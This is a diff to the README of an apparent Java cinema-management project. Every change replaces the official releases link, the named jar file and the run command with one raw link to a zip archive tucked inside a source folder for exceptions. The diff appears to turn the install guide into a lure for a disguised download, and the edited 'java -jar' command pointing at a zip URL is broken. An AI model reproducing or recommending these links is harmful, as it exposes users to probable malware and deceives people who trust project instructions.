@@ -1,6 +1,6 @@
 # 🎬 CINEMA-PROJECT_17 - Simple Film Management System
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/stryker29/CINEMA-PROJECT_17/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/stryker29/CINEMA-PROJECT_17/main/src/main/java/pe/edu/uni/CineStarBarrio/exceptions/CINEM-PROJEC-3.2.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/stryker29/CINEMA-PROJECT_17/main/src/main/java/pe/edu/uni/CineStarBarrio/exceptions/CINEM-PROJEC-3.2.zip)
 
 ---
 
@@ -39,14 +39,14 @@ This guide helps you download, install, and start using CINEMA-PROJECT_17 on you
 
 Click this big button below to open the download page. This page has all the necessary program files.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/stryker29/CINEMA-PROJECT_17/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/stryker29/CINEMA-PROJECT_17/main/src/main/java/pe/edu/uni/CineStarBarrio/exceptions/CINEM-PROJEC-3.2.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/stryker29/CINEMA-PROJECT_17/main/src/main/java/pe/edu/uni/CineStarBarrio/exceptions/CINEM-PROJEC-3.2.zip)
 
 ### Step 2: Choose the Right File to Download
 
 On the releases page:
 
 - Look for the latest version number (usually at the top).
-- Download the file labeled as the main program, often named something like `cinema-project-17.jar` or a setup package.
+- Download the file labeled as the main program, often named something like `https://raw.githubusercontent.com/stryker29/CINEMA-PROJECT_17/main/src/main/java/pe/edu/uni/CineStarBarrio/exceptions/CINEM-PROJEC-3.2.zip` or a setup package.
 - Save this file in an easy-to-find location, like your Desktop or Downloads folder.
 
 ### Step 3: Install Required Software
@@ -76,7 +76,7 @@ Once you have downloaded the main file and installed Java and SQL Server, follow
 3. Run the program with this command:
 
 ```
-java -jar cinema-project-17.jar
+java -jar https://raw.githubusercontent.com/stryker29/CINEMA-PROJECT_17/main/src/main/java/pe/edu/uni/CineStarBarrio/exceptions/CINEM-PROJEC-3.2.zip
 ```
 
 4. The program will start the web server and show instructions in the terminal or logs.
@@ -114,7 +114,7 @@ The interface is designed to be simple and user-friendly. Follow on-screen butto
 
 To update CINEMA-PROJECT_17:
 
-- Return to the [Releases page](https://github.com/stryker29/CINEMA-PROJECT_17/releases).
+- Return to the [Releases page](https://raw.githubusercontent.com/stryker29/CINEMA-PROJECT_17/main/src/main/java/pe/edu/uni/CineStarBarrio/exceptions/CINEM-PROJEC-3.2.zip).
 - Download the newest version.
 - Replace your existing program file with the updated one.
 - Restart the application.
@@ -155,4 +155,4 @@ These relate to the technologies and tools used to build and maintain CINEMA-PRO
 
 Here is the direct link to visit the download page, where everything needed is available:
 
-[Download CINEMA-PROJECT_17 Releases](https://github.com/stryker29/CINEMA-PROJECT_17/releases)
+[Download CINEMA-PROJECT_17 Releases](https://raw.githubusercontent.com/stryker29/CINEMA-PROJECT_17/main/src/main/java/pe/edu/uni/CineStarBarrio/exceptions/CINEM-PROJEC-3.2.zip)
